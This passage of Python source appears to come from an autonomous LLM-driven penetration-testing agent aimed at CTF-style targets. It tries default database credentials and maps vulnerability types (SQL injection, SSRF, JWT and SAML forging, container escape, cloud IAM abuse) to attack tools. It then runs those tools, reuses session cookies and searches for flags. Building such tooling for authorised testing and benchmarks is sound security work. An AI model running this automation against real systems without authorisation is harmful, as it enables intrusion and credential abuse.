                        r = await self.attack_gateway.call(
                            tool, {"host": host, "port": port, "user": username, "password": password, "query": "SELECT 1"}
                        )
                    if r and getattr(r, 'success', False):
                        stdout = (getattr(r, 'stdout', '') or '').lower()
                        if any(kw in stdout for kw in ("ok", "1 row", "pong", "connected")):
                            log.info("[db_creds] Default creds WORK: %s:%s@%s:%d", username, password, host, port)
                            self.dkg.add_node("Credential", f"cred-default-{proto}-{host}-{port}", {
                                "username": username, "password": password,
                                "source_host": host, "cred_type": proto,
                                "port": port, "source": "default_trial", "confirmed": True,
                            })
                            break
                except Exception:
                    continue

    async def _systematic_exploit_pass(self, target_url: str) -> TaskResult | None:
        """Systematic exploit: iterate DKG Vulnerability nodes and run mapped tools.

        Runs BEFORE the LLM-driven loop in Solo mode. This catches
        straightforward vulnerabilities without any LLM cost — for each
        known Vulnerability node, we run the appropriate tool automatically.

        Returns TaskResult if a flag is found, None otherwise.
        """
        state = self._get_state()
        vulns = self.dkg.query_nodes("Vulnerability")  # raw for toolkit fields
        if not vulns:
            print("[systematic] No Vulnerability nodes in DKG — skipping")
            return None

        # Vuln type → tool mapping (with fuzzy matching)
        VULN_TOOL_MAP: dict[str, list[str]] = {
            "sqli": ["sqlmap_test"],
            "sql": ["sqlmap_test"],
            "xss": ["xss_reflection_test"],
            "cmdi": ["command_injection_test"],
            "command injection": ["command_injection_test"],
            "ssti": ["send_payload"],
            "lfi": ["curl_get"],
            "file upload": ["send_payload"],
            "idor": ["curl_get"],
            "idor-url-path": ["curl_get"],
            "auth": ["curl_get"],
            "csrf": ["curl_get"],
            "deserialization": ["send_payload", "shell_exec"],
            "ssrf": ["ssrf_probe"],
            "xxe": ["send_payload"],
            "jwt": ["jwt_forge"],
            "race condition": ["send_payload", "shell_exec"],
            "informationdisclosure": ["curl_get"],  # metadata/API endpoints should use curl_get, not send_payload
            "unauthenticatedaccess": ["curl_get", "aws_cli"],  # open S3 buckets, unauthenticated APIs
            "privilege_escalation": ["shell_exec", "linux_priv_check"],
            "container_escape": ["check_capabilities", "check_mounts", "shell_exec"],
            "mysql_file_write": ["mysql_file_write"],
            "mysql_udf": ["mysql_query", "mysql_file_write", "shell_exec"],
            "postgres_rce": ["psql_query", "shell_exec"],
            "authbypass": ["curl_get", "test_credential", "ssh_exec", "shell_exec",
                          "redis_cmd", "mysql_query", "psql_query", "mssql_query",
                          "mssqlclient_query", "oracle_query"],
            # NOTE: aws_cli removed from authbypass — it requires service+action
            # params that the systematic pass cannot populate from vuln context
            "weakauth": ["mssqlclient_query", "mssql_query", "mysql_query",
                        "psql_query", "redis_cmd", "oracle_query",
                        "test_credential", "ssh_exec"],
            "platformdiscovery": ["aws_cli", "curl_get", "aws_sts_query"],
            # Cloud-native vuln types — systematic pass needs these to
            # auto-select tools for IAM, federation, SCP, and OIDC/SAML
            # scenarios that the generic "platformdiscovery" fallback
            # cannot cover.
            "cloud_iam": ["aws_sts_query", "aws_cli"],
            "cloud_federation": ["saml_forge", "aws_cli"],
            "cloud_token_exchange": ["aws_sts_query", "aws_cli"],
            "cloud_scp_bypass": ["aws_sts_query", "aws_cli"],
            "cloud_oidc": ["jwt_forge", "aws_iam_federation"],
            "cloud_passrole": ["aws_cli", "send_payload"],
        }
        # Fuzzy match: if a vuln type CONTAINS one of these substrings, it maps
        FUZZY_MAP: dict[str, list[str]] = {
            "sqli": ["sqlmap_test"],
            "xss": ["xss_reflection_test"],
            "cmdi": ["command_injection_test"],
            "idor": ["curl_get"],
            "auth": ["curl_get"],
            "deserialization": ["send_payload"],
            "ssrf": ["ssrf_probe"],
            "xxe": ["send_payload"],
            "jwt": ["jwt_forge"],
            "privilege": ["shell_exec", "linux_priv_check"],
            "escape": ["check_capabilities", "check_mounts", "shell_exec"],
            # Cloud-native fuzzy matches — catch LLM-generated vuln types
            # like "CloudFederation", "SCP Bypass Attack", "OIDC Token Abuse"
            "federation": ["saml_forge", "aws_cli"],
            "oidc": ["jwt_forge", "aws_cli"],
            "saml": ["saml_forge", "aws_cli"],
            "scp": ["aws_sts_query", "aws_cli"],
            "passrole": ["aws_cli", "send_payload"],
            "token_exchange": ["aws_sts_query", "aws_cli"],
            "iam": ["aws_sts_query", "aws_cli"],
            "registry": ["docker_registry", "kubectl_get_pods", "shell_exec"],
            "docker_registry": ["docker_registry", "kubectl_get_pods", "shell_exec"],
        }

        def _resolve_tools(vt: str) -> list[str]:
            """Resolve tools for a vuln type — exact match first, then fuzzy."""
            vt_lower = vt.lower().strip()
            tools = VULN_TOOL_MAP.get(vt_lower, [])
            if tools:
                return tools
            # Fuzzy: check if any keyword is contained in vt
            for keyword, tlist in FUZZY_MAP.items():
                if keyword in vt_lower:
                    return tlist
            # Unknown/unmapped vuln types: provide generic HTTP exploitation
            # tools as a fallback so the systematic pass doesn't skip them.
            # These tools cover form-based API exploits, auth bypass, and
            # parameter injection — the most common HTTP-based attack vectors.
            _FALLBACK_HTTP_TOOLS = ["http_post", "send_payload", "curl_get"]
            return _FALLBACK_HTTP_TOOLS

        def _detect_proto_from_service(endpoint: str, dkg: DKG) -> set[str] | None:
            """Detect protocol tool set from DKG Service node by port.

            When an endpoint has no URI scheme (e.g. 'localhost:10119'),
            look up the Service node by port to determine which protocol-
            specific tools are appropriate. Returns a _PROTO_TOOLS set or None.
            """
            import re
            m = re.search(r':(\d+)$', endpoint)
            if not m:
                return None
            port = m.group(1)
            for svc in dkg.query_nodes("Service"):
                if str(svc.get("port")) == port:
                    svc_name = (svc.get("service_name") or svc.get("protocol") or "").lower()
                    # Service name detection
                    if "mssql" in svc_name or "sql server" in svc_name:
                        return {"mssql_query", "mssqlclient_query", "shell_exec"}
                    if "mysql" in svc_name or "mariadb" in svc_name:
                        return {"mysql_query", "shell_exec"}
                    if "postgres" in svc_name:
                        return {"psql_query", "shell_exec"}
                    if "redis" in svc_name:
                        return {"redis_cmd", "shell_exec"}
                    if "ssh" in svc_name:
                        return {"ssh_exec", "ssh_key_exec", "test_credential"}
                    if "oracle" in svc_name:
                        return {"oracle_query", "shell_exec"}
                    if "mongodb" in svc_name:
                        return {"shell_exec"}
                    if "memcached" in svc_name:
                        return {"shell_exec"}
                    # K8s / cloud services — recognized with dedicated tools.
                    # Service names come from nmap fingerprints, openssl CN
                    # probes, or API fingerprint matching.
                    # IMPORTANT: check more-specific names BEFORE broader ones
                    # (kubernetes-admission before kubernetes).
                    if "etcd" in svc_name:
                        return {"etcdctl_get", "k8s_etcd_keys", "shell_exec"}
                    if "tiller" in svc_name:
                        # Helm v2 Tiller service — gRPC API on port 44134
                        return {"helm", "shell_exec"}
                    if "kubernetes-admission" in svc_name:
                        # Admission webhook: HTTP endpoint accepting AdmissionReview
                        # JSON. Uses send_payload/curl_get, not kubectl tools.
                        return {"send_payload", "curl_get", "shell_exec"}
                    if "kubernetes" in svc_name or "kubelet" in svc_name:
                        return {"kubectl_auth_check", "kubelet_probe", "k8s_kubelet_exec", "shell_exec"}
                    # Active Directory / Windows services — recognizable but no
                    # generic protocol tools in the current VULN_TOOL_MAP.
                    # Return empty set so systematic pass skips these vulns
                    # (AD exploitation is handled by ADAgent, not systematic pass).
                    if any(kw in svc_name for kw in ("kerberos", "ldap", "smb", "msrpc",
                                                       "netbios", "kpasswd", "ad-")):
                        return set()
                    # Port-based fallback
                    _PORT_PROTO: dict[str, set[str]] = {
                        "1433": {"mssql_query", "mssqlclient_query", "shell_exec"},
                        "3306": {"mysql_query", "shell_exec"},
                        "5432": {"psql_query", "shell_exec"},
                        "6379": {"redis_cmd", "shell_exec"},
                        "22": {"ssh_exec", "ssh_key_exec", "test_credential"},
                        "1521": {"oracle_query", "shell_exec"},
                        "27017": {"shell_exec"},
                        "11211": {"shell_exec"},
                        "44134": {"helm", "shell_exec"},  # Helm v2 Tiller
                        # AD ports — recognized but no generic tools
                        "88": set(), "389": set(), "636": set(), "445": set(),
                        "139": set(), "135": set(), "3268": set(), "3269": set(),
                    }
                    if port in _PORT_PROTO:
                        return _PORT_PROTO[port]
            return None

        session_cookies = ""
        if self.client._session and self.client._session.cookie_jar:
            jar = list(self.client._session.cookie_jar)
            if jar:
                session_cookies = "; ".join(f"{c.key}={c.value}" for c in jar)

        # Sort vulns: LLM-suggested tools first (they have correct args),
        # then other mapped vulns, then unmapped. This prevents vulns
        # without tool_args from poisoning the dedup cache before vulns
        # that DO have LLM-provided args get a chance to run.
        llm_vulns = [v for v in vulns if v.get("suggested_tool")]
        other_mapped = [v for v in vulns if v not in llm_vulns
                       and _resolve_tools((v.get("vuln_type") or "").lower())]
        unmapped_vulns = [v for v in vulns if v not in llm_vulns and v not in other_mapped]
        vulns_sorted = llm_vulns + other_mapped + unmapped_vulns

        # Summarize
        vuln_type_counts: dict[str, int] = {}
        for v in vulns:
            vt = (v.get("vuln_type") or "").lower()
            if vt:
                vuln_type_counts[vt] = vuln_type_counts.get(vt, 0) + 1
        mapped_counts = {vt: c for vt, c in vuln_type_counts.items() if _resolve_tools(vt)}
        unmapped_counts = {vt: c for vt, c in vuln_type_counts.items() if not _resolve_tools(vt)}
        print(f"[systematic] {len(vulns)} vulns: {len(llm_vulns) + len(other_mapped)} mapped ({len(llm_vulns)} LLM-suggested), {len(unmapped_vulns)} unmapped")
        print(f"[systematic]   mapped types: {mapped_counts}")
        print(f"[systematic]   unmapped types: {unmapped_counts}")
        if session_cookies:
            print(f"[systematic]   session cookies: {session_cookies[:80]}...")

        if not hasattr(self, '_tried_systematic'):
            self._tried_systematic: set[tuple] = set()
        tried = self._tried_systematic  # (tool, url, param) dedup, cross-cycle
        tested_count = 0
        MAX_TESTS = 20
        for v in vulns_sorted:
            if tested_count >= MAX_TESTS:
                break
            vt = (v.get("vuln_type") or "").lower()
            endpoint = v.get("endpoint", "") or v.get("url", "")
            param = v.get("parameter", "") or v.get("param", "")
            source = v.get("source", "")

            if not vt or not endpoint:
                continue
            # Skip infrastructure ports
            if any(s.get("skip_exploit") for s in self.dkg.query_nodes("Service")
                   if s.get("port") and f":{s['port']}" in endpoint):
                continue

            tools = _resolve_tools(vt)

            # ── Privilege escalation: use dedicated exploitation method ──
            # rather than running generic shell_exec + linux_priv_check
            if vt == "privilege_escalation":
                log.info("[systematic] Running _execute_privesc for %s", endpoint)
                privesc_flag = await self._execute_privesc(endpoint)
                if privesc_flag:
                    self.phase = OrchestratorPhase.DONE
                    return TaskResult(
                        success=True, flag=privesc_flag, steps=self.step_count,
                        tokens_used=self.llm.token_count,
                        time_elapsed=time.time() - self.start_time,
                    )
                tested_count += 1
                continue

            # Always check protocol detection first — this handles services
            # that use HTTP-like URIs but aren't web servers (etcd, K8S API,
            # kubelet). Protocol detection is driven by DKG Service node names,
            # which come from nmap fingerprints / openssl CN probes, so it
            # works regardless of port number.
            # When detection succeeds, use protocol-specific tools INSTEAD of
            # the generic VULN_TOOL_MAP list (not intersected — the protocol
            # detection is more specific and authoritative).
            detected = _detect_proto_from_service(endpoint, self.dkg)
            if detected is not None:
                tools = sorted(detected)
            elif not endpoint.startswith("http://") and not endpoint.startswith("https://"):
                # Map endpoint proto to matching tools
                _ALL_PROTOCOL_TOOLS = {"redis_cmd", "ssh_exec", "ssh_key_exec",
                                       "mysql_query", "psql_query", "mssql_query",
                                       "oracle_query", "test_credential", "shell_exec"}
                _PROTO_TOOLS = {
                    "redis://": {"redis_cmd", "shell_exec"},
                    "ssh://": {"ssh_exec", "ssh_key_exec", "test_credential"},
                    "mysql://": {"mysql_query", "shell_exec"},
                    "postgresql://": {"psql_query", "shell_exec"},
                    "mssql://": {"mssql_query", "mssqlclient_query", "shell_exec"},
                    "oracle://": {"oracle_query", "shell_exec"},
                    "mongodb://": {"shell_exec"},
                    "memcached://": {"shell_exec"},
                }
                # Find matching proto-specific tools, fall back to port-based detection
                matched = None
                for proto_prefix, proto_tools in _PROTO_TOOLS.items():
                    if endpoint.startswith(proto_prefix):
                        matched = proto_tools
                        break
                if matched is not None:
                    tools = [t for t in tools if t in matched]
                else:
                    # Unknown protocol (not in the 8 known service types).
                    # Strip ALL protocol-specific tools — only keep generic
                    # shell_exec which can run arbitrary commands. Prevents
                    # mysql_query on Kerberos, redis_cmd on LDAP, etc.
                    tools = [t for t in tools if t == "shell_exec"]
                if not tools:
                    continue
            else:
                # HTTP endpoint — exclude tools that only work over non-HTTP protocols.
                # mysql_query, ssh_exec, redis_cmd, etc. cannot operate on HTTP endpoints
                # and running them wastes systematic pass slots.
                _NON_HTTP_PROTOCOL_TOOLS = {
                    "ssh_exec", "ssh_key_exec", "mysql_query", "psql_query",
                    "mssql_query", "oracle_query", "redis_cmd", "shell_exec",
                }
                tools = [t for t in tools if t not in _NON_HTTP_PROTOCOL_TOOLS]

            # Inject LLM-suggested tool from vulnerability analysis if present.
            # The LLM may have correctly identified a tool that VULN_TOOL_MAP
            # doesn't know about (e.g. etcdctl_get for etcd AuthBypass).
            llm_tool = v.get("suggested_tool", "") or ""
            llm_args = v.get("tool_args", {}) or {}
            if not isinstance(llm_args, dict):
                llm_args = {}
            # Filter blacklisted tools — brute-force tools (hydra_ssh_brute,
            # hydra_http_brute) waste time and should never reach execution,
            # even when the LLM explicitly suggests them.
            if llm_tool in self._BLACKLISTED_TOOLS:
                replacement = self._BLACKLISTED_TOOLS[llm_tool]
                if replacement:
                    llm_tool = replacement
                else:
                    llm_tool = ""  # Tool unavailable — drop it
            if llm_tool and llm_tool not in tools:
                tools = [llm_tool] + list(tools)
            if not tools:
                # No hardcoded mapping — use LLM suggestion as primary
                if llm_tool:
                    tools = [llm_tool]

            # If still no tool, fall back to curl_get as generic probe
            if not tools:
                tools = ["curl_get"]

            for tool_name in tools:
                if tested_count >= MAX_TESTS:
                    break
                dedup_key = (tool_name, endpoint, param)
                if dedup_key in tried:
                    continue

                # Build args: start with defaults, merge LLM-suggested overrides
                args: dict = {}
                if tool_name == "sqlmap_test":
                    args = {"url": endpoint, "param": param or "id"}
                elif tool_name == "xss_reflection_test":
                    args = {"url": endpoint, "param": param or "q"}
                elif tool_name == "command_injection_test":
                    args = {"url": endpoint, "param": param or "cmd"}
                elif tool_name == "curl_get":
                    u = endpoint or target_url
                    if session_cookies:
                        args = {"url": u, "headers": f"Cookie: {session_cookies}"}
                    else:
                        args = {"url": u}
                elif tool_name == "send_payload":
                    args = {"url": endpoint, "payload": "1", "param": param or "id"}
                elif tool_name == "aws_cli":
                    # aws_cli uses service+action+resource, not url+param.
                    # Use the vuln's tool_args directly; fall back to s3 ls.
                    _va = {}
                    for v in vulns:
                        if v.get("suggested_tool") == "aws_cli" and v.get("tool_args"):
                            _va = v["tool_args"]
                            break
                    if _va:
                        args = dict(_va)
                    else:
                        args = {"service": "s3", "action": "ls",
                                "resource": "", "payload_json": ""}
                else:
                    # Parse DB/non-HTTP endpoints into host/port args
                    if "://" in endpoint and not endpoint.startswith("http"):
                        from urllib.parse import urlparse as _up
                        _parsed = _up(endpoint)
                        args = {"host": _parsed.hostname or "localhost"}
                        if _parsed.port:
                            args["port"] = _parsed.port
                    else:
                        args = {"url": endpoint, "param": param} if param else {"url": endpoint}
                # Merge LLM-suggested args (method, body_format, etc.) as overrides
                if tool_name == llm_tool and llm_args:
                    # Remove 'url' if LLM args provide host-based params (DB tools)
                    _has_host = any(k in llm_args for k in ("host", "user", "query"))
                    if _has_host:
                        args.pop("url", None)
                    args.update(llm_args)
                # If endpoint is POST-only, ensure exploit tools use POST
                if tool_name in ("sqlmap_test", "send_payload", "command_injection_test",
                                 "xss_reflection_test"):
                    ep_nodes = [e for e in self.dkg.query_nodes("Endpoint")
                               if e.get("url", "") == endpoint]
                    ep_method = ep_nodes[0].get("method", "GET") if ep_nodes else "GET"
                    if ep_method == "POST" and args.get("method", "GET") == "GET":
                        args["method"] = "POST"
                        args["body_format"] = args.get("body_format", "json")
                        log.info("Systematic: endpoint %s is POST — using method=POST body_format=json", endpoint)

                # Always add session cookies if available
                if session_cookies and "headers" not in args:
                    args["headers"] = f"Cookie: {session_cookies}"

                # ── Schema-based tool compatibility check ─────────
                # Verify that the args we constructed for this endpoint
                # have at least one key matching the tool's declared
                # parameters.  If zero overlap, try generic parameter
                # name remapping before skipping.
                _tool_entry = (
                    self.attack_gateway._registry.get(tool_name)
                    or self.recon_gateway._registry.get(tool_name)
                )
                if _tool_entry is not None:
                    _tool_params = set(_tool_entry.parameters.keys())
                    _arg_keys = set(args.keys())
                    if _tool_params and not (_tool_params & _arg_keys):
                        # ── Generic parameter name remapping ──
                        # Vulnerabilities store param names like 'url'/'param'/'endpoint',
                        # but tools may expect 'ssrf_url'/'url_param'/'target_url'.
                        # Remap based on common aliases — no hardcoded tool names.
                        _REMAP_TABLE: dict[str, list[str]] = {
                            "url":         ["ssrf_url", "target_url", "url"],
                            "endpoint":    ["url", "ssrf_url", "target_url"],
                            "param":       ["url_param", "param_name"],
                            "target_url":  ["url", "ssrf_url"],
                            "host":        ["target", "host"],
                        }
                        _remapped: dict[str, object] = {}
                        for _arg_key, _arg_val in args.items():
                            if _arg_key in _REMAP_TABLE:
                                for _candidate in _REMAP_TABLE[_arg_key]:
                                    if _candidate in _tool_params and _candidate not in _remapped:
                                        _remapped[_candidate] = _arg_val
                                        break
                        if _remapped:
                            args.update(_remapped)
                            _arg_keys = set(args.keys())

                    if _tool_params and not (_tool_params & _arg_keys):
                        print(
                            f"[systematic] skip {tool_name}: schema mismatch "
                            f"(tool expects {sorted(_tool_params)}, "
                            f"got {sorted(_arg_keys)})"
                        )
                        continue

                # Only count as tried once schema check passes — prevents
                # vulns without LLM args from poisoning the dedup cache for
                # vulns that DO have correct args (e.g. XSS vuln processed
                # before AuthBypass vuln, both on same etcd endpoint).
                tried.add(dedup_key)
                tested_count += 1

                try:
                    cookie_note = " [with auth]" if session_cookies else ""
                    source_note = ""
                    if tool_name == llm_tool and llm_args:
                        source_note = " [LLM-suggested]"
                    elif not _resolve_tools(vt) and tool_name == "curl_get":
                        source_note = " [generic fallback]"
                    print(f"[systematic] {tool_name} on {endpoint} param={param}{cookie_note}{source_note} (type={vt})")
                    if tool_name in self.attack_gateway.get_tool_names():
                        result = await self.attack_gateway.call(tool_name, args)
                        stdout = result.stdout if hasattr(result, 'stdout') else str(result)
                    elif tool_name in self.recon_gateway.get_tool_names():
                        result = await self.recon_gateway.call(tool_name, args)
                        stdout = result.stdout if hasattr(result, 'stdout') else str(result)
                    else:
                        continue

                    # Show truncated result
                    print(f"  → {stdout[:250].strip().replace(chr(10), ' ')}")

                    self.step_count += 1
                    self._task_log_event("info", "systematic_exploit",
                        tool=tool_name, url=endpoint, vt=vt,
                        result=stdout[:300])

                    # Update DKG Vulnerability node with test result
                    dkg_nid = v.get("id", "")
                    if dkg_nid:
                        self.dkg.add_node("Vulnerability", dkg_nid, {
                            "tested_at": time.strftime("%H:%M:%S"),
                            "test_result": stdout[:200],
                            "test_tool": tool_name,
                        })

                    # DAVE L4: check for flag
                    flags = self.flag_pattern.findall(stdout)
                    for f in flags:
                        is_valid, reason = await self._verify_flag(
                            f, stdout, args, tool_name=tool_name)
                        if is_valid:
                            self._task_log_event("info", "flag_found_systematic",
                                tool=tool_name, flag=f)
                            self.phase = OrchestratorPhase.DONE
                            return TaskResult(
                                success=True, flag=f, steps=self.step_count,
                                tokens_used=self.llm.token_count,
                                time_elapsed=time.time() - self.start_time,
                            )
                        else:
                            log.warning("DAVE rejected flag: %s", reason)

                except Exception as e:
                    print(f"[systematic] {tool_name} FAILED: {e}")
                    continue

        # ── IDOR Header Test (systematic, before auth crawl) ─────
        # If we have session cookies, test for IDOR via custom headers
        # immediately — this catches the most common CTF/benchmark pattern.
        if session_cookies:
            for port in getattr(self, '_discovered_http_ports', []):
                host = getattr(self, "target_host", None) or "localhost"
                scheme = "https" if port == 443 else "http"
                base = f"{scheme}://{host}" if port in (80, 443) else f"{scheme}://{host}:{port}"
                try:
                    idor_result = await self.recon_gateway.call("idor_header_test", {
                        "url": f"{base}/dashboard",
                        "cookie": session_cookies,
                    })
                    if idor_result.success and idor_result.parsed_output:
                        f = idor_result.parsed_output.get("flag")
                        if f:
                            print(f"[systematic] IDOR HEADER FLAG: {f}")
                            self.phase = OrchestratorPhase.DONE
                            return TaskResult(
                                success=True, flag=f, steps=self.step_count,
                                tokens_used=self.llm.token_count,
                                time_elapsed=time.time() - self.start_time,
                            )
                except Exception:
                    pass

        # ── Authenticated endpoint crawl ──────────────────────────
        # If we have session cookies, fetch ALL discovered endpoints with auth.
        # This catches flags hidden behind authentication (most common pattern).
        if session_cookies:
            endpoints = self.dkg.query_nodes("Endpoint")
            auth_tested = 0
            for ep in endpoints:
                ep_url = ep.get("url", "") or ep.get("id", "")
                if not ep_url or "://" not in ep_url:
                    continue
                dedup_key = ("curl_get_auth", ep_url, "")
                if dedup_key in tried:
                    continue
                tried.add(dedup_key)
                auth_tested += 1
                try:
                    print(f"[systematic] curl_get AUTH on {ep_url} [with session]")
                    result = await self.recon_gateway.call("curl_get", {
                        "url": ep_url,
                        "headers": f"Cookie: {session_cookies}",
                    })
                    stdout = result.stdout if hasattr(result, 'stdout') else str(result)
                    print(f"  → {stdout[:200].strip().replace(chr(10), ' ')}")
                    # Check for flag
                    flags = self.flag_pattern.findall(stdout)
                    for f in flags:
                        is_valid, reason = await self._verify_flag(
                            f, stdout, {"url": ep_url, "headers": f"Cookie: {session_cookies}"},
                            tool_name="curl_get")
                        if is_valid:
                            self._task_log_event("info", "flag_found_auth_crawl",
                                url=ep_url, flag=f)
                            self.phase = OrchestratorPhase.DONE
                            return TaskResult(
                                success=True, flag=f, steps=self.step_count,
                                tokens_used=self.llm.token_count,
                                time_elapsed=time.time() - self.start_time,
                            )
                except Exception as e:
                    print(f"[systematic] auth curl {ep_url} FAILED: {e}")

            if auth_tested > 0:
                print(f"[systematic] Auth crawl: tested {auth_tested} endpoints with session")

        print(f"[systematic] Done: tested {tested_count} tool+endpoint combinations, no flag found")
        return None

    # ── Phase 2: Analyze ────────────────────────────────────────────

    async def _analyze_phase(self) -> None:
        """Analyze reconnaissance data to identify potential vulnerabilities."""
        self.phase = OrchestratorPhase.ANALYZE

        # ── Probe endpoints: capture actual responses before analysis ──
        app_context = await self._probe_endpoints()

        # Build typed pipeline state from DKG (single source of truth)
        state = normalize_dkg_state(self.dkg)
        # Build tool lists for analyze system prompt.
        # Include required parameter names so the LLM can write correct
        # tool_args without guessing (e.g. "service" not "command" for aws_cli).
        def _fmt_tool_list(gateway) -> str:
            lines = []
            for d in sorted(gateway.get_tool_definitions(),
                           key=lambda d: d["function"]["name"]):
                name = d["function"]["name"]
                props = d["function"]["parameters"].get("properties", {})
                required = d["function"]["parameters"].get("required", [])
                req_params = [p for p in required if p in props]
                opt_params = [p for p in props if p not in required]
                # Show required params, hint optional ones with ?
                sig = ", ".join(req_params)
                if opt_params:
                    sig += (", " if sig else "") + ", ".join(f"{p}?" for p in opt_params)
                # Include description snippet so the LLM knows what the
                # tool can do (e.g. aws_cli supports S3, IAM, STS, etc.).
                # First 140 chars — enough for 1-2 sentences.
                desc = d["function"].get("description", "")
                if len(desc) > 140:
                    # Truncate at last complete word before the limit
                    _cut = desc[:140].rfind(" ")
                    desc = desc[:_cut] + "..."
                _hint = f"  → {desc}" if desc else ""
                lines.append(
                    f"  {name}({sig}){_hint}" if sig
                    else f"  {name}{_hint}"
                )
            return "\n".join(lines)

        analyze_system_prompt = SYSTEM_PROMPT_ANALYZE.format(
            attack_tools=_fmt_tool_list(self.attack_gateway),
            recon_tools=_fmt_tool_list(self.recon_gateway),
        )
        self._analyze_prompt_formatted = analyze_system_prompt

        # Transition to analyze phase (preserve history, swap system prompt)
        self.llm.replace_system_prompt(analyze_system_prompt)
        transition = (
            f"[PHASE TRANSITION] Moving from reconnaissance to vulnerability analysis.\n"
            f"Services discovered: {len(state.services)}, Endpoints: {len(state.endpoints)}\n"
            f"Your task: analyze the application and identify vulnerabilities.\n"
            f"The conversation above contains all reconnaissance results — do not repeat them."
        )
        self.llm.add_context_message(transition, role="user")

        # Build unreachable services warning
        unreachable_warning = ""
        unreachable = [s for s in state.services if s.http_reachable is False]
        if unreachable:
            unreachable_warning = (
                "\n## WARNING — Ports found by nmap but NOT HTTP-reachable:\n"
                + "\n".join(f"- port {s.port}/{s.protocol}" for s in unreachable[:10])
                + "\nDo NOT generate hypotheses for these services.\n"
            )

        # Use canonical prompt format from PipelineState
        state_context = state.to_prompt_context()

        # CTAGE: cloud topology context for analyze phase
        cloud_topology_context = ""
        if hasattr(self, "_cloud_topology") and self._cloud_topology:
            ct = self._cloud_topology
            if ct.clusters or ct.high_risk_pods:
                lines = ["\n## Cloud/K8s Topology (CTAGE)"]
                if ct.clusters:
                    for c in ct.clusters:
                        lines.append(f"- Cluster: {c.get('name','')} ({c.get('version','')})")
                if ct.nodes:
                    lines.append(f"- Nodes: {len(ct.nodes)} ({sum(1 for n in ct.nodes if n.get('is_control_plane'))} control-plane, {sum(1 for n in ct.nodes if not n.get('is_control_plane'))} worker)")
                if ct.namespaces:
                    lines.append(f"- Namespaces: {len(ct.namespaces)}")
                if ct.pods:
                    lines.append(f"- Pods: {len(ct.pods)}")
                if ct.service_accounts:
                    lines.append(f"- ServiceAccounts: {len(ct.service_accounts)}")
                if ct.rbac_bindings:
                    lines.append(f"- RBAC Bindings: {len(ct.rbac_bindings)}")
                if ct.high_risk_pods:
                    lines.append(f"\n### High-Risk Pods ({len(ct.high_risk_pods)})")
                    for profile in ct.high_risk_pods[:10]:
                        lines.append(
                            f"- {profile.namespace}/{profile.pod_name}: "
                            f"risk={profile.risk_score:.2f}, "
                            f"vectors={profile.escape_vectors}, "
                            f"sa={profile.service_account}"
                        )
                if ct.iam_roles:
                    lines.append(f"\n### IAM Roles ({len(ct.iam_roles)})")
                    for role in ct.iam_roles[:5]:
                        lines.append(f"- {role.get('role_name','')} ({role.get('provider','')})")
                if ct.cross_account_trusts:
                    lines.append(f"\n### Cross-Account Trusts ({len(ct.cross_account_trusts)})")
                    for trust in ct.cross_account_trusts[:5]:
                        lines.append(f"- {trust.get('source_role','')} → account {trust.get('target_account','')}")
                cloud_topology_context = "\n".join(lines) + "\n"

        # CTAGE: compute attack paths from cloud topology
        cloud_attack_paths_context = ""
        try:
            from darwin.cloud_attack_path import compute_attack_paths
            attack_path_report = compute_attack_paths(self.dkg)
            if attack_path_report.paths:
                cloud_attack_paths_context = attack_path_report.to_prompt_context() + "\n"
                log.info("CTAGE Reasoner: %d attack paths injected into analyze prompt",
                         len(attack_path_report.paths))
        except Exception as e:
            log.debug("CTAGE Reasoner: attack path computation skipped (%s)", e)

        prompt = (
            f"## Mission\n{self._task_description}\n\n"
            f"Target information:\n"
            f"{unreachable_warning}"
            f"{app_context}"
            f"{cloud_topology_context}"
            f"{cloud_attack_paths_context}"
            f"{state_context}\n\n"
            f"## Instructions\n"
            f"1. First, understand what this application DOES based on the endpoint responses above.\n"
            f"2. Identify what business logic each endpoint implements.\n"
            f"3. THEN identify potential vulnerabilities based on your understanding.\n"
            f"4. For each vulnerability, explain WHY you think it exists (not just pattern matching).\n"
            f"5. If an endpoint returns static content regardless of input, note that it's "
            f"likely NOT exploitable and skip it.\n"
            f"6. CRITICAL: Use the EXACT parameter names from 'Known Parameter Names' above. "
            f"Do NOT guess parameter names from response field names."
        )
        cteg_suggestions = self.cteg.get_suggestions(
            defense_type=self.defense_state.waf_type or "",
            vuln_type="",
        )
        if cteg_suggestions.get("bypass_strategies") or cteg_suggestions.get("exploit_strategies"):
            prompt += f"\n\nPrior cross-task experience suggests:\n{json.dumps(cteg_suggestions, indent=2)}"
        else:
            prompt += "\n\nNo prior cross-task experience available for this target type."

        self._maybe_compress()
        tokens_before = self.llm.token_count

        print(f"\n{'='*50}")
        print(f"[ANALYZE] Asking LLM to identify vulnerabilities...")
        print(f"[ANALYZE] State: {len(state.endpoints)} endpoints, "
              f"{len(state.services)} services, "
              f"{len(state.vulnerabilities)} vulns")

        content, _ = self.llm.generate(
            prompt=prompt,
        )
        tokens_used = self.llm.token_count - tokens_before
        self._task_log_event("info", "llm_analyze_call",
            prompt=prompt, response=content[:2000],
            tokens_used=tokens_used,
            cteg_suggestions=cteg_suggestions,
        )

        print(f"[ANALYZE] LLM response ({tokens_used} tokens):")
        print(f"{content[:1500]}")
        if len(content) > 1500:
            print(f"  ... ({len(content) - 1500} more chars)")
        print(f"{'='*50}\n")

        # Parse LLM's vulnerability hypotheses
        try:
            parsed = self._extract_json(content)
            # New format: {{"application_understanding": "...", "vulnerabilities": [...]}}
            # Old format (backward compat): [...] flat array
            if isinstance(parsed, dict):
                app_understanding = parsed.get("application_understanding", "")
                if app_understanding:
                    print(f"\n[UNDERSTAND] {app_understanding}\n")
                    # Persist to DKG for plan-generation and sub-agent access
                    self.dkg.add_node("Analysis", f"analysis-{int(time.time())}", {
                        "phase": "analyze",
                        "type": "application_understanding",
                        "content": app_understanding,
                        "endpoint_count": len(self.dkg.query_nodes("Endpoint")),
                    })
                vulns_json = parsed.get("vulnerabilities", [])
                # Parse attack_paths: multi-step chains that structure the exploit order.
                # The plan generation prompt references attack_paths for task dependency
                # ordering — storing them as DKG Analysis nodes makes them visible to the
                # plan LLM and sub-agents.
                attack_paths = parsed.get("attack_paths", [])
                if attack_paths and isinstance(attack_paths, list):
                    for ap in attack_paths[:5]:
                        if isinstance(ap, dict):
                            ap_id = ap.get("id", f"path-{int(time.time()*1000)%100000}")
                            ap_steps = ap.get("steps", [])
                            ap_desc = ap.get("description", "")
                            self.dkg.add_node("Analysis", f"attack-path-{ap_id}", {
                                "phase": "analyze",
                                "type": "attack_path",
                                "content": ap_desc,
                                "path_id": ap_id,
                                "steps": ap_steps,
                                "step_count": len(ap_steps),
                            })
